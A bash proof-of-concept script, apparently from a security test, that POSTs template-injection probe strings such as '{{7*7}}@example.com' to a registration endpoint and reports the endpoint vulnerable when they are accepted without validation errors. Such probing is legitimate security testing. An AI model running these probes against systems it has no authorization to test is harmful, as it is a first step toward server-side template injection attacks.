#!/bin/bash

# POC: Email Template Injection Payload Acceptance (Improved)
# Target: /accounts/register/step2/
# Objective: Demonstrate that template injection syntax is accepted as valid email

TARGET_URL="${1:-http://localhost:8000}"
ENDPOINT="/accounts/register/step2/"

echo "[*] Testing Email Template Injection Payload Acceptance"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test payloads with template injection syntax
declare -a PAYLOADS=(
    "{{7*7}}@example.com"
    "\${7*7}@example.com"
    "{%7*7%}@example.com"
)

# Alternative valid emails for comparison
declare -a VALID_EMAILS=(
    "test@example.com"
    "user123@example.com"
)

echo "[*] Testing with valid emails first (baseline)..."
for email in "${VALID_EMAILS[@]}"; do
    echo "[*] Valid email test: $email"
    curl -s -X POST \
        "${TARGET_URL}${ENDPOINT}" \
        -d "email=${email}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -o /dev/null -w "    HTTP Status: %{http_code}\n"
done

echo ""
echo "[*] Testing with template injection payloads..."
for payload in "${PAYLOADS[@]}"; do
    echo "[*] Injection payload: $payload"
    
    # Use verbose output to see request details
    response=$(curl -s -X POST \
        "${TARGET_URL}${ENDPOINT}" \
        -d "email=${payload}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -w "\n%{http_code}")
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | sed '$d')
    
    echo "    HTTP Status: $http_code"
    
    # Check response for acceptance indicators
    if [[ "$http_code" == "200" ]] || [[ "$http_code" == "302" ]] || [[ "$http_code" == "201" ]]; then
        echo "    [+] VULNERABLE: Payload accepted (HTTP $http_code)"
        
        # Look for error messages in response
        if echo "$body" | grep -i "error\|invalid\|must be" > /dev/null; then
            echo "    [-] But validation errors found in response"
        else
            echo "    [+] No validation errors detected"
        fi
    else
        echo "    [-] Payload rejected or connection error (HTTP $http_code)"
    fi
    
    echo ""
done

echo "[*] POC Complete"